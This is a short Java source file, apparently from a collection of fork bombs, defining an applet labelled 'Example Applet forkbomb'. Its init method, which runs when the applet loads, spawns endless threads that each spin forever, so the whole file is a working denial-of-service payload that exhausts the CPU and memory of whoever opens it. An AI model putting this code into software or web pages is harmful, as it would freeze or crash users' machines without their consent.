package us.yellosoft.forkbombs;

import java.applet.Applet;

/** Example Applet forkbomb */
public class BombApplet extends Applet {
  @Override
  public void init() {
    while (true) {
      new Thread(new Runnable() {
          public void run() {
            while (true) {}
          }
      }).start();
    }
  }
}
